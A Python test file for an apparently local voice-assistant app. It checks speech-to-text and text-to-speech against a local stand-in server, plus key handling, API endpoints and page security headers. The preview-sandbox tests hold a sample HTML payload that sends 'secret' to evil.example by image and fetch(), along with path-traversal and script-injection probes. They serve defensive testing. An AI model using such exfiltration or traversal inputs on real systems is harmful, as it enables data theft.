"""Hearing and speaking, checked against a local stand-in for ElevenLabs and Whisper (no real service is contacted)."""
import http.client
import json
import os
import re
import struct
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from jcc import config, secrets, speech
from tests.helpers import EngineTestCase
from tests.test_gui import GuiTestCase

ELEVEN_KEY = "sk_" + "0123456789abcdef" * 3
VOICES = [{"voice_id": "voiceZed00001", "name": "Zed", "labels": {"accent": "american", "gender": "male"}, "category": "premade"},
          {"voice_id": "voiceGeorge01", "name": "George - Warm", "labels": {"accent": "british", "gender": "male"}, "category": "premade"},
          {"voice_id": "bad id!", "name": "Broken"}]


class StandIn:
    """A tiny copy of the parts of ElevenLabs and Whisper that JARVIS uses."""

    def __init__(self):
        self.calls, self.ports, self.fail, self.heard = [], set(), set(), " Hello JARVIS, open the calculator."
        outer = self

        class Handler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *args):
                return

            def reply(self, code, data):
                body = json.dumps(data).encode()
                self.send_response(code)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def handle_any(self):
                length = int(self.headers.get("Content-Length") or 0)
                raw = self.rfile.read(length) if length else b""
                outer.ports.add(self.client_address[1])
                outer.calls.append({"method": self.command, "path": self.path, "headers": dict(self.headers), "body": raw})
                path = self.path.split("?")[0]
                if path.startswith("/w/"):
                    if self.headers.get("Authorization") != "Bearer " + os.environ.get("JCC_GROQ_API_KEY", ""):
                        return self.reply(401, {"error": {"message": "Invalid API Key"}})
                    if path == "/w/models":
                        return self.reply(200, {"data": []})
                    if "busy" in outer.fail:
                        return self.reply(429, {"error": {"message": "rate limit"}})
                    silent = "silence" in outer.fail
                    return self.reply(200, {"text": outer.heard, "language": "english", "duration": 0.4 if silent else 2.5,
                                            "segments": [{"text": outer.heard, "no_speech_prob": 0.9 if silent else 0.01, "avg_logprob": -1.3 if silent else -0.1}]})
                if self.headers.get("xi-api-key") != ELEVEN_KEY:
                    return self.reply(401, {"detail": {"status": "invalid_api_key", "message": "Invalid API key"}})
                if path == "/v2/voices":
                    return self.reply(200, {"voices": VOICES, "has_more": False})
                if path == "/v1/user/subscription":
                    return self.reply(200, {"tier": "starter", "character_count": 1500, "character_limit": 30000})
                if path.startswith("/v1/single-use-token/"):
                    return self.reply(200, {"token": "sutkn_onetimepass12345"})
                if path.startswith("/v1/text-to-speech/"):
                    asked = json.loads(raw)
                    if "quota" in outer.fail:
                        return self.reply(401, {"detail": {"status": "quota_exceeded", "message": "quota exceeded"}})
                    if "old_plan" in outer.fail and asked["model_id"] != "eleven_flash_v2_5":
                        return self.reply(400, {"detail": {"status": "model_not_available", "message": "model not available on your plan"}})
                    if "no_pcm" in outer.fail and "pcm_" in self.path:
                        return self.reply(403, {"detail": {"status": "output_format_not_allowed", "message": "upgrade for pcm"}})
                    self.send_response(200)
                    self.send_header("Content-Type", "audio/mpeg" if "mp3" in self.path else "application/octet-stream")
                    self.send_header("Transfer-Encoding", "chunked")
                    self.end_headers()
                    sound = outer.sound(asked["text"], "mp3" in self.path)
                    for start in range(0, len(sound), 4000):
                        chunk = sound[start:start + 4000]
                        self.wfile.write(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")
                        self.wfile.flush()
                    self.wfile.write(b"0\r\n\r\n")
                    return None
                return self.reply(404, {"detail": "not found"})

            do_GET = do_POST = handle_any

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.address = f"http://127.0.0.1:{self.server.server_address[1]}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def sound(self, text, mp3):
        return (b"ID3" + b"\x00" * 3997) * 3 if mp3 else struct.pack("<2000h", *([1200, -1200] * 1000)) * 3

    def close(self):
        self.server.shutdown()
        self.server.server_close()

    def last(self, fragment):
        return next(call for call in reversed(self.calls) if fragment in call["path"])


class SpeechMixin:
    def start_stand_in(self):
        self.remote = StandIn()
        self._saved = {name: os.environ.get(name) for name in ("JCC_ELEVENLABS_BASE", "JCC_WHISPER_BASE")}
        os.environ["JCC_ELEVENLABS_BASE"], os.environ["JCC_WHISPER_BASE"] = self.remote.address, self.remote.address + "/w"
        secrets._memory.clear()
        speech._cache.clear()
        speech._pool.clear()

    def stop_stand_in(self):
        speech._pool.clear()
        speech._cache.clear()
        secrets._memory.clear()
        self.remote.close()
        for name, value in self._saved.items():
            if value is None:
                os.environ.pop(name, None)
            else:
                os.environ[name] = value


class TestSpeech(SpeechMixin, EngineTestCase):
    def setUp(self):
        super().setUp()
        self.cfg = config.load()
        self.start_stand_in()

    def tearDown(self):
        self.stop_stand_in()
        super().tearDown()

    def test_settings(self):
        self.assertEqual(speech.settings(self.cfg), speech.DEFAULTS)
        saved = speech.configure(self.cfg, {"listen": "eleven", "language": "hi", "words": "  Asha   Jaipur ", "wake": True, "speed": 5, "tts_model": "eleven_flash_v2_5"})
        self.assertEqual((saved["listen"], saved["language"], saved["words"], saved["wake"], saved["speed"]), ("eleven", "hi", "Asha Jaipur", True, 1.2))
        self.assertEqual(speech.settings(self.cfg), saved)
        for bad in ({"listen": "magic"}, {"language": "klingon"}, {"voice_id": "../x"}, {"wake": "yes"}, {"nonsense": 1}, "x"):
            with self.assertRaises(speech.SpeechError):
                speech.configure(self.cfg, bad)
        (self.cfg.state_dir / "speech.json").write_text('{"listen": "nonsense", "speed": "fast", "language": "en"}', "utf-8")
        self.assertEqual(speech.settings(self.cfg)["listen"], "auto", "a damaged settings file falls back to safe values")

    def test_which_engines_are_used(self):
        self.assertEqual(speech.engines(self.cfg), ("whisper", "browser"), "Whisper through the Groq key; the browser's voice until ElevenLabs is added")
        secrets.store("elevenlabs", ELEVEN_KEY)
        self.assertEqual(speech.engines(self.cfg), ("whisper", "eleven"))
        speech.configure(self.cfg, {"listen": "eleven", "speak": "browser"})
        self.assertEqual(speech.engines(self.cfg), ("eleven", "browser"))
        speech.configure(self.cfg, {"listen": "browser"})
        self.assertEqual(speech.engines(self.cfg)[0], "browser")
        secrets.delete("elevenlabs")
        speech.configure(self.cfg, {"listen": "eleven", "speak": "auto"})
        self.assertEqual(speech.engines(self.cfg), ("whisper", "browser"), "a choice without its key falls back to what is available")
        groq, os.environ["JCC_GROQ_API_KEY"] = os.environ.pop("JCC_GROQ_API_KEY"), ""
        try:
            os.environ.pop("JCC_GROQ_API_KEY")
            self.assertEqual(speech.engines(self.cfg), ("browser", "browser"))
        finally:
            os.environ["JCC_GROQ_API_KEY"] = groq

    def test_a_key_is_checked_before_it_is_kept_and_never_shown(self):
        for bad, why in (("short", "does not look like a key"), ("sk_" + "f" * 48, "did not accept the key")):
            with self.assertRaises(speech.SpeechError) as caught:
                speech.save_key(self.cfg, bad)
            self.assertIn(why, str(caught.exception))
        self.assertIsNone(secrets.get("elevenlabs"))
        status = speech.save_key(self.cfg, "  " + ELEVEN_KEY + " ")
        self.assertTrue(status["configured"])
        self.assertEqual(secrets.get("elevenlabs"), ELEVEN_KEY)
        self.assertNotIn(ELEVEN_KEY, json.dumps(speech.status(self.cfg, True)))
        self.assertEqual(speech.status(self.cfg, True)["usage"], {"used": 1500, "limit": 30000, "percent": 5.0, "plan": "starter", "renews": None})
        for path in self.state.rglob("*"):
            if path.is_file():
                self.assertNotIn(ELEVEN_KEY, path.read_text("utf-8", errors="ignore"), "the key is in Windows Credential Manager only")
        self.assertFalse(speech.forget_key(self.cfg)["configured"])
        with self.assertRaises(speech.SpeechError):
            speech.save_key(self.cfg, ELEVEN_KEY, "mystery")
        self.assertTrue(speech.save_key(self.cfg, os.environ["JCC_GROQ_API_KEY"], "groq")["keys"]["groq"])

    def test_voices_and_one_time_passes(self):
        with self.assertRaises(speech.SpeechError):
            speech.voices(self.cfg)
        secrets.store("elevenlabs", ELEVEN_KEY)
        rows = speech.voices(self.cfg)
        self.assertEqual([(v["id"], v["name"]) for v in rows], [("voiceGeorge01", "George - Warm"), ("voiceZed00001", "Zed")], "well-known voices first, broken ones left out")
        speech.voices(self.cfg)
        self.assertEqual(sum(1 for c in self.remote.calls if c["path"].startswith("/v2/voices")), 1, "the list is kept for a while")
        self.assertEqual(speech.chosen_voice(self.cfg), ("voiceGeorge01", "George - Warm"))
        self.assertEqual(speech.settings(self.cfg)["voice_id"], "voiceGeorge01", "the first good voice becomes the default")
        self.assertEqual(speech.token("realtime_scribe"), "sutkn_onetimepass12345")
        with self.assertRaises(speech.SpeechError):
            speech.token("admin")
        from jcc.redact import redact
        self.assertNotIn("sutkn_onetimepass12345", redact("pass: sutkn_onetimepass12345"))

    def test_speaking_streams_sound_and_reuses_the_connection(self):
        secrets.store("elevenlabs", ELEVEN_KEY)
        speech.configure(self.cfg, {"voice_id": "voiceGeorge01", "speed": 1.1})
        kind, pieces = speech.tts_stream(self.cfg, "  Hello   there.  ", previous="It is four o'clock.")
        sound = b"".join(pieces)
        self.assertEqual((kind, len(sound)), ("pcm", 12000))
        call = self.remote.last("/v1/text-to-speech/")
        self.assertEqual(call["path"], "/v1/text-to-speech/voiceGeorge01/stream?output_format=pcm_24000")
        self.assertEqual(json.loads(call["body"]), {"text": "Hello there.", "model_id": "eleven_v4_turbo", "voice_settings": {"speed": 1.1},
                                                    "previous_text": "It is four o'clock."})
        b"".join(speech.tts_stream(self.cfg, "Second sentence.")[1])
        b"".join(speech.tts_stream(self.cfg, "Third sentence.", "voiceZed00001")[1])
        self.assertEqual(len(self.remote.ports), 1, "one kept-open connection, so later sentences skip the handshake")
        self.assertIn("voiceZed00001", self.remote.last("/v1/text-to-speech/")["path"])
        for bad in ("", "   ", "x" * 5001):
            with self.assertRaises(speech.SpeechError):
                speech.tts_stream(self.cfg, bad)

    def test_speaking_falls_back_when_the_plan_lacks_something(self):
        secrets.store("elevenlabs", ELEVEN_KEY)
        speech.configure(self.cfg, {"voice_id": "voiceGeorge01"})
        self.remote.fail = {"old_plan"}
        kind, pieces = speech.tts_stream(self.cfg, "Hello.")
        self.assertEqual((kind, len(b"".join(pieces))), ("pcm", 12000))
        self.assertEqual(json.loads(self.remote.last("/v1/text-to-speech/")["body"])["model_id"], "eleven_flash_v2_5")
        self.remote.fail = {"no_pcm"}
        kind, pieces = speech.tts_stream(self.cfg, "Hello.")
        self.assertEqual((kind, b"".join(pieces)[:3]), ("mp3", b"ID3"))
        self.remote.fail = {"quota"}
        before = len(self.remote.calls)
        with self.assertRaises(speech.SpeechError) as caught:
            speech.tts_stream(self.cfg, "Hello.")
        self.assertIn("allowance is used up", str(caught.exception))
        self.assertEqual(len(self.remote.calls) - before, 1, "no pointless retries once the allowance is gone")

    def test_whisper_hears_what_was_said(self):
        speech.configure(self.cfg, {"words": "Asha, Jaipur"})
        heard = speech.hear(self.cfg, b"\x01\x02" * 16000, "Notepad")
        self.assertEqual((heard["text"], heard["engine"], heard["language"]), ("Hello JARVIS, open the calculator.", "groq", "english"))
        call = self.remote.last("/w/audio/transcriptions")
        body = call["body"]
        fields = dict(re.findall(rb'name="([\w\[\]]+)"\r\n\r\n([^\r]*)\r\n', body))
        self.assertEqual({k.decode(): v.decode() for k, v in fields.items()},
                         {"model": "whisper-large-v3-turbo", "response_format": "verbose_json", "temperature": "0", "prompt": "JARVIS, Notepad, Asha, Jaipur.", "language": "en"})
        self.assertIn(b'filename="speech.wav"', body)
        start = body.index(b"RIFF")
        self.assertEqual(body[start + 8:start + 12], b"WAVE")
        self.assertEqual(struct.unpack_from("<I", body, start + 24)[0], 16000, "sent as 16 kHz sound")
        speech.configure(self.cfg, {"language": "auto"})
        speech.hear(self.cfg, b"\x01\x02" * 16000)
        self.assertNotIn(b'name="language"', self.remote.last("/w/audio/transcriptions")["body"])

    def test_only_talk_meant_for_jarvis_is_told_its_name(self):
        """Whisper writes down a name it has been told when it hears only a noise. Dictation and recordings are not told it."""
        def prompt():
            fields = dict(re.findall(rb'name="([\w\[\]]+)"\r\n\r\n([^\r]*)\r\n', self.remote.last("/w/audio/transcriptions")["body"]))
            return fields.get(b"prompt", b"").decode()
        speech.configure(self.cfg, {"words": "Asha"})
        speech.hear(self.cfg, b"\x01\x02" * 16000)
        self.assertEqual(prompt(), "JARVIS, Asha.", "talking to JARVIS")
        speech.hear(self.cfg, b"\x01\x02" * 16000, names=False)
        self.assertEqual(prompt(), "Asha.", "dictating into another app")
        speech.transcribe(self.cfg, speech.wav(b"\x01\x02" * 16000), "meeting.wav")
        self.assertEqual(prompt(), "Asha.", "a recording")
        speech.transcribe(self.cfg, speech.wav(b"\x01\x02" * 16000), "wake.wav", prompt="Coach", names=True)
        self.assertEqual(prompt(), "JARVIS, Coach, Asha.", "the sentence that followed the wake word")

    def test_silence_and_noise_are_not_turned_into_words(self):
        before = len(self.remote.calls)
        self.assertEqual(speech.hear(self.cfg, b"\x00" * 800)["text"], "", "too short to be speech: not even sent")
        self.assertEqual(len(self.remote.calls), before)
        self.remote.fail, self.remote.heard = {"silence"}, " Thank you."
        self.assertEqual(speech.hear(self.cfg, b"\x00\x00" * 16000)["text"], "")
        with self.assertRaises(speech.SpeechError):
            speech.hear(self.cfg, b"\x00" * (speech.MAX_SPEECH_BYTES + 2))
        for data, hint, expected in (({"text": " Open Notepad. "}, "", "Open Notepad."), ({"text": "Thank you.", "duration": 3.0}, "", "Thank you."),
                                     ({"text": "you", "duration": 0.3}, "", ""), ({"text": "JARVIS JARVIS", "duration": 2}, "JARVIS, Asha.", ""),
                                     ({"text": "Asha, JARVIS.", "duration": 2}, "JARVIS, Asha.", ""), ({"text": "Call Asha", "duration": 2}, "JARVIS, Asha.", "Call Asha"),
                                     ({"text": "Jarvis?", "duration": 1.5}, "JARVIS.", "Jarvis?"),
                                     ({"segments": [{"text": " Real words", "no_speech_prob": 0.1, "avg_logprob": -0.2}, {"text": " hmm", "no_speech_prob": 0.8, "avg_logprob": -1.5}]}, "", "Real words")):
            self.assertEqual(speech.clean_transcript(data, hint), expected, data)

    def test_recordings_can_be_transcribed_and_problems_are_explained(self):
        self.remote.heard = " Minutes of the meeting."
        out = speech.transcribe(self.cfg, b"ID3fake-mp3-bytes", "Team  meeting (final).mp3")
        self.assertEqual(out["text"], "Minutes of the meeting.")
        body = self.remote.last("/w/audio/transcriptions")["body"]
        self.assertIn(b'filename="meeting__final_.mp3"', body.replace(b"Team__", b""))
        self.assertIn(b"Content-Type: audio/mpeg", body)
        self.remote.fail = {"busy"}
        with self.assertRaises(speech.SpeechError) as caught:
            speech.transcribe(self.cfg, b"x" * 100, "a.wav")
        self.assertIn("busy", str(caught.exception))
        self.assertTrue(caught.exception.busy, "the window is told it may try again shortly")
        self.assertEqual(speech.hint_text("JARVIS", "jarvis", "Asha, Jaipur; asha", ""), "JARVIS, Asha, Jaipur.", "each word once: a repeated word makes Whisper hear it")
        self.assertEqual(speech.hint_text("", "  "), "")
        with self.assertRaises(speech.SpeechError):
            speech.transcribe(self.cfg, b"", "a.wav")
        os.environ["JCC_WHISPER_BASE"] = "http://127.0.0.1:9"
        speech._pool.clear()
        with self.assertRaises(speech.SpeechError) as caught:
            speech.transcribe(self.cfg, b"x" * 100, "a.wav")
        self.assertIn("Could not reach", str(caught.exception))

    def test_the_end_to_end_check_reports_both_halves(self):
        secrets.store("elevenlabs", ELEVEN_KEY)
        original, speech.sample_speech = speech.sample_speech, lambda text, run=None: b"\x01\x02" * 16000
        try:
            report = speech.self_test(self.cfg)
            self.assertEqual((report["ok"], report["listening"]["ok"], report["speaking"]["ok"], report["speaking"]["voice"]), (True, True, True, "George - Warm"))
            self.remote.heard = " Something else entirely."
            self.assertFalse(speech.self_test(self.cfg)["ok"], "a wrong transcript is reported as a failure")
        finally:
            speech.sample_speech = original

    def test_wav_wrapping(self):
        wrapped = speech.wav(b"\x01\x00" * 10)
        self.assertEqual((wrapped[:4], wrapped[8:16], len(wrapped)), (b"RIFF", b"WAVEfmt ", 64))
        self.assertEqual(struct.unpack_from("<IHHIIHH", wrapped, 16), (16, 1, 1, 16000, 32000, 2, 16))


class TestSpeechApi(SpeechMixin, GuiTestCase):
    def setUp(self):
        super().setUp()
        self.start_stand_in()

    def tearDown(self):
        self.stop_stand_in()
        super().tearDown()

    def raw(self, path, body, ctype="application/octet-stream", token=True):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=15)
        headers = {"Host": f"127.0.0.1:{self.port}", "Content-Type": ctype}
        if token:
            headers["X-JCC-Token"] = self.state.token
        c.request("POST", path, body=body, headers=headers)
        r = c.getresponse()
        out = (r.status, r.getheader("Content-Type"), r.read())
        c.close()
        return out

    def test_status_settings_and_keys(self):
        status, data = self.req("GET", "/api/speech")
        self.assertEqual((status, data["listen"], data["speak"], data["configured"], data["mail"]["connected"]), (200, "whisper", "browser", False, False))
        self.assertEqual(self.req("GET", "/api/speech", token=False)[0], 401)
        self.assertEqual(self.req("GET", "/api/speech/voices")[0], 400, "no ElevenLabs key yet")
        status, data = self.req("POST", "/api/speech", {"action": "key", "value": ELEVEN_KEY})
        self.assertEqual((status, data["configured"], data["speak"]), (200, True, "eleven"))
        self.assertEqual(self.req("POST", "/api/speech", {"action": "key", "value": "nope"})[0], 400)
        self.assertEqual(self.req("GET", "/api/speech/voices")[1]["voices"][0]["name"], "George - Warm")
        self.assertEqual(self.req("POST", "/api/speech", {"action": "settings", "settings": {"wake": True}})[1]["settings"]["wake"], True)
        self.assertEqual(self.req("POST", "/api/speech", {"action": "token", "kind": "realtime_scribe"})[1]["token"], "sutkn_onetimepass12345")
        self.assertEqual(self.req("POST", "/api/speech", {"action": "warm"})[0], 200)
        self.assertEqual(self.req("POST", "/api/speech", {"action": "dance"})[0], 400)
        status, data = self.req("POST", "/api/speech", {"action": "forget"})
        self.assertEqual((status, data["configured"]), (200, False))

    def test_sound_is_streamed_to_the_window_and_speech_is_heard(self):
        self.req("POST", "/api/speech", {"action": "key", "value": ELEVEN_KEY})
        status, kind, sound = self.raw("/api/speech/tts", json.dumps({"text": "Hello there.", "previous": "Hi."}), "application/json")
        self.assertEqual((status, kind, len(sound)), (200, "audio/L16;rate=24000", 12000))
        self.assertEqual(self.raw("/api/speech/tts", json.dumps({"text": ""}), "application/json")[0], 400)
        self.assertEqual(self.raw("/api/speech/tts", json.dumps({"text": "Hello."}), "application/json", token=False)[0], 401)
        status, _, body = self.raw("/api/speech/stt?hint=Notepad", b"\x01\x02" * 16000)
        self.assertEqual((status, json.loads(body)["text"]), (200, "Hello JARVIS, open the calculator."))
        self.assertEqual(self.raw("/api/speech/stt", b"\x00" * (4_200_000))[0], 413)
        status, _, body = self.raw("/api/speech/transcribe?name=talk.mp3", b"ID3" + b"\x00" * 500)
        self.assertEqual((status, json.loads(body)["engine"]), (200, "groq"))
        self.assertEqual(self.raw("/api/speech/stt", b"\x01\x02" * 16000, token=False)[0], 401)
        self.remote.fail = {"busy"}
        status, _, body = self.raw("/api/speech/stt", b"\x01\x02" * 16000)
        self.assertEqual((status, json.loads(body)["busy"]), (429, True))

    def test_email_account_over_http(self):
        from jcc import mailer
        from tests.test_voice_parts import FakeMailServer
        log, original = [], mailer._open
        mailer._open = lambda host, port, factory=None: FakeMailServer(log)
        try:
            status, data = self.req("POST", "/api/mail", {"action": "connect", "address": "me@gmail.com", "password": "app-password"})
            self.assertEqual((status, data["connected"], "password" in json.dumps(data)), (200, True, False))
            self.assertEqual(self.req("GET", "/api/mail")[1]["address"], "me@gmail.com")
            self.assertEqual(self.req("POST", "/api/mail", {"action": "connect", "address": "me@gmail.com", "password": "wrong-password"})[0], 400)
            self.assertEqual(self.req("POST", "/api/mail", {"action": "disconnect"})[1]["connected"], False)
            self.assertEqual(self.req("POST", "/api/mail", {"action": "explode"})[0], 400)
        finally:
            mailer._open = original


class TestPageSafety(GuiTestCase):
    def page(self, headers=None, path="/"):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        c.request("GET", path, headers={"Host": f"127.0.0.1:{self.port}", **(headers or {})})
        r = c.getresponse()
        out = (r.status, dict((k.lower(), v) for k, v in r.getheaders()), r.read().decode("utf-8", errors="replace"))
        c.close()
        return out

    def test_only_the_apps_own_scripts_can_run(self):
        status, headers, html = self.page()
        policy = headers["content-security-policy"]
        nonce = re.search(r"'nonce-([\w-]{16,})'", policy).group(1)
        self.assertEqual(status, 200)
        script_rule = next(part for part in policy.split(";") if part.strip().startswith("script-src"))
        self.assertNotIn("unsafe-inline", script_rule)
        self.assertNotIn("unsafe-eval", policy)
        for expected in ("frame-ancestors 'none'", "object-src 'none'", "base-uri 'none'", "form-action 'none'", "connect-src 'self' wss://api.elevenlabs.io"):
            self.assertIn(expected, policy)
        inline = re.findall(r"<script(?![^>]*\bsrc=)([^>]*)>", html)
        self.assertGreaterEqual(len(inline), 3)
        self.assertTrue(all(f'nonce="{nonce}"' in tag for tag in inline), "every inline script carries this page's one-time code")
        self.assertNotIn("__JCC_", html)
        self.assertNotEqual(nonce, re.search(r"'nonce-([\w-]{16,})'", self.page()[1]["content-security-policy"]).group(1), "a new code for every load")
        self.assertEqual((headers["x-frame-options"], headers["x-content-type-options"], headers["cross-origin-opener-policy"]), ("DENY", "nosniff", "same-origin"))
        self.assertIn("microphone=(self)", headers["permissions-policy"])
        self.assertNotRegex(html, r"\son(click|load|error|input|change)\s*=", "no inline event handlers, which the rules above would block anyway")

    def test_a_link_from_another_site_cannot_start_listening(self):
        self.assertIn('name="jcc-direct" content="1"', self.page()[2])
        self.assertIn('name="jcc-direct" content="1"', self.page({"Sec-Fetch-Site": "none"}, "/?listen")[2])
        for origin in ("cross-site", "same-site"):
            self.assertIn('name="jcc-direct" content="0"', self.page({"Sec-Fetch-Site": origin}, "/?listen")[2], origin)

    def test_answers_from_the_api_cannot_be_framed_or_run(self):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        c.request("GET", "/api/state", headers={"Host": f"127.0.0.1:{self.port}", "X-JCC-Token": self.state.token})
        r = c.getresponse()
        r.read()
        self.assertEqual(r.getheader("Content-Security-Policy"), "default-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'")
        self.assertEqual(r.getheader("X-Frame-Options"), "DENY")
        c.close()

    def test_previews_run_in_a_sealed_frame(self):
        status, made = self.req("POST", "/api/preview", {"html": "<h1>Hi</h1><script>fetch('/api/state')</script>"})
        self.assertEqual(status, 200)
        status, headers, html = self.page(path="/preview/" + made["id"])
        self.assertEqual(status, 200)
        policy = headers["content-security-policy"]
        self.assertTrue(html.endswith("<h1>Hi</h1><script>fetch('/api/state')</script>"), "the page itself is as it was written")
        self.assertTrue(html.startswith("<script>// The first thing that runs in a sealed preview page"), "the guard comes first")
        self.assertTrue(policy.startswith("sandbox allow-scripts"), "the page gets an origin of its own, so it cannot use JARVIS")
        self.assertNotIn("allow-same-origin", policy)
        self.assertIn("frame-ancestors 'self'", policy)
        self.assertEqual(self.page(path="/preview/unknown")[0], 404)
        self.assertEqual(self.req("POST", "/api/preview", {"html": ""})[0], 400)
        self.assertEqual(self.req("POST", "/api/preview", {"html": "<p>x</p>"}, token=False)[0], 401)
        self.assertEqual(self.req("GET", "/api/state", origin="null")[0], 403, "a sealed page's requests are refused outright")
        for index in range(14):
            self.req("POST", "/api/preview", {"html": f"<p>{index}</p>"})
        self.assertEqual(self.page(path="/preview/" + made["id"])[0], 404, "old previews are dropped")

    def test_a_preview_is_sealed_from_the_internet_unless_its_owner_allows_it(self):
        # A page may have been written from what was read on a web page or in an email, and it opens by itself. Sealed, it
        # has no way to send what it contains anywhere: no picture, request, form, window or outside code.
        leak = "<!doctype html><html><body><img src='https://evil.example/?d=secret'><script>fetch('https://evil.example/?d=secret')</script></body></html>"
        made = self.req("POST", "/api/preview", {"html": leak})[1]
        status, headers, html = self.page(path="/preview/" + made["id"])
        policy = headers["content-security-policy"]
        for part in ("img-src data: blob:;", "connect-src 'none'", "form-action 'none'", "media-src data: blob:;", "default-src 'none'", "base-uri 'none'"):
            self.assertIn(part, policy)
        self.assertNotIn("allow-popups", policy)
        self.assertNotIn("allow-top-navigation", policy)
        self.assertIsNone(re.search(r"https:(;|$| )", policy), "no address is allowed as a whole kind, only the named libraries")
        self.assertIn("https://cdn.jsdelivr.net", policy.split("script-src")[1].split(";")[0], "the libraries a diagram or an app is drawn with still load")
        self.assertTrue(html.startswith("<!doctype html><script>// The first thing"), "the guard goes after the first line, which has to stay first")
        self.assertNotIn("nonce", policy, "no one-time code: a script given one could be fetched from any address")
        hidden = self.req("POST", "/api/preview", {"html": "<div><template ShadowRootMode='closed'><iframe srcdoc='x'></iframe></template></div>"})[1]
        self.assertIn("<template data-shadowrootmode='closed'>", self.page(path="/preview/" + hidden["id"])[2], "no tree is made that the guard cannot look into")
        for wish in (True, "yes", 1):
            made = self.req("POST", "/api/preview", {"html": leak, "online": wish})[1]
            status, headers, html = self.page(path="/preview/" + made["id"])
            open_to_all = "connect-src https:" in headers["content-security-policy"]
            self.assertEqual(open_to_all, wish is True, "only a plain yes from the window opens it")
            self.assertEqual(html == leak, wish is True)
            self.assertNotIn("allow-same-origin", headers["content-security-policy"])

    def test_a_preview_in_a_window_of_its_own_stays_in_a_frame(self):
        # On its own a page could take itself to any address, carrying what it contains. In a frame it cannot leave.
        made = self.req("POST", "/api/preview", {"html": "<h1>Hi</h1>"})[1]
        status, headers, html = self.page(path="/preview/" + made["id"], headers={"Sec-Fetch-Dest": "document"})
        self.assertEqual(status, 200)
        self.assertIn('<iframe sandbox="allow-scripts allow-forms allow-modals" referrerpolicy="no-referrer" src="/preview/' + made["id"] + '"></iframe>', html)
        self.assertNotIn("<h1>Hi</h1>", html)
        self.assertEqual(headers["content-security-policy"], "default-src 'none'; style-src 'unsafe-inline'; frame-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'")
        self.assertEqual(self.page(path="/preview/" + made["id"], headers={"Sec-Fetch-Dest": "iframe"})[2].endswith("<h1>Hi</h1>"), True)
        self.assertEqual(self.page(path='/preview/"><script>alert(1)</script>', headers={"Sec-Fetch-Dest": "document"})[0], 404, "only a preview that exists is ever written into a page")

    def test_only_listed_files_are_served(self):
        for path in ("/nova-audio.js", "/nova-mic.js", "/nova-voice.js", "/nova.css", "/vendor/xterm.js"):
            self.assertEqual(self.page(path=path)[0], 200, path)
        for path in ("/../config.yaml", "/jcc/gui.py", "/static/desktop.html", "/nova.js/../../secrets.py", "/vendor/../nova.js", "/.git/config"):
            self.assertEqual(self.page(path=path)[0], 404, path)


if __name__ == "__main__":
    import unittest
    unittest.main()
